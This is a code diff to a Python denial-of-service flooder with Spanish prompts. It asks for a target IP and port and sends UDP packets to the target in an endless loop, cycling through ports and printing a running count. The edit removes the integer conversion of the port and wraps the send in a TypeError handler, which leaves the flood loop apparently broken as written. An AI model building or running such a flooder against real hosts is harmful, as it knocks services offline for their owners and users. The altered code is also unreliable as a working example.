@@ -24,16 +24,23 @@ while True:
     if options=='1':
         system('clear')
         ip = input('\033[1;33m'+'IP del objetivo: '+'\033[1;32m')
-        port = int(input('\033[1;33m'+'Puerto: '+'\033[1;32m'))
-
+        port = input('\033[1;33m'+'Puerto: '+'\033[1;32m')   
+        
+        #Packets counter
         sent = 0
-
+        
         while True:
-            sock.sendto(bytes, (ip,port))
-            sent += 1
-            print('\033[0;32m'+'Se enviaron '+'\033[0;31m'+f'{sent}'+'\033[0;32m'+' a '+'\033[0;31m'+f'{ip}'+'\033[0;32m'+' por el puerto: '+'\033[0;31m'+f'{port}')
-            if port == 65534:
-                port = 1
+            try:
+                sock.sendto(bytes, (ip,port))
+                sent += 1
+                print('\033[0;32m'+'Se enviaron '+'\033[0;31m'+f'{sent}'+'\033[0;32m'+' a '+'\033[0;31m'+f'{ip}'+'\033[0;32m'+' por el puerto: '+'\033[0;31m'+f'{port}')
+                if port == 65534:
+                    port = 1
+            except TypeError:
+                    print('\033[0;31m'+'\nLos valores ingresados no son validos\n')
+                    input('\033[1;33m'+'\t\t Presione Enter para continuar...')
+                    break
+                
     #Close program
     elif options=='x':
         system('clear')
